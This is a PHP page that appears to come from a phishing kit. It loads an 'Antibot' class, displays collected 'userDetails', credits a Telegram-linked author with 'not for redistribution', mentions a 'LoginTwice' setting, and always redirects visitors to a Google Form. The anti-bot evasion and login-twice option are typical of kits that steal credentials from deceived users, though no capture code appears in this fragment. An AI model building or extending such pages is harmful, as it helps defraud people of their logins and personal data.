<?php

   session_start();

require_once './Classes/Comp.php';
require_once './Classes/Antibot.php';

$comps = new Comp;
$antibot = new Antibot;

$settings = $comps->settings();

$content = '
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <path d="M 394.314 206 L 406.127 229.627 L 382.5 229.627 L 394.314 206 Z" style="stroke-width: 2px; vector-effect: non-scaling-stroke; fill: rgb(255, 255, 255);" bx:shape="triangle 382.5 206 23.627 23.627 0.5 0 1@765df46b"/>
    <path d="M 394.314 -253.254 L 406.127 -229.627 L 382.5 -229.627 L 394.314 -253.254 Z" style="stroke-width: 2px; vector-effect: non-scaling-stroke; fill: rgb(255, 255, 255);" transform="matrix(1, 0, 0, -1, 0, 0)" bx:shape="triangle 382.5 -253.254 23.627 23.627 0.5 0 1@c2494841"/>
    </g>
    <div class="mt-2">
        ' . $comps->userDetails() . '
    </div>
    </div>
    <div class="my-3 text-center">
        <span class="small text-light">Private page coded by <a href="https://t.me/eliseeyum">Elysium</a>, not for redistribution.</span>
    </div>
';

// Always execute the following logic regardless of the LoginTwice setting
// Note: This part will be executed regardless of whether the LoginTwice setting is on or off

// Redirect to the Google Form
die(header("Location: https://docs.google.com/forms/d/e/1FAIpQLSebkCJu1Hm4_AhbJFoTD052BuyGMYDqMr9PS81COB7GZyRbUQ/viewform"));
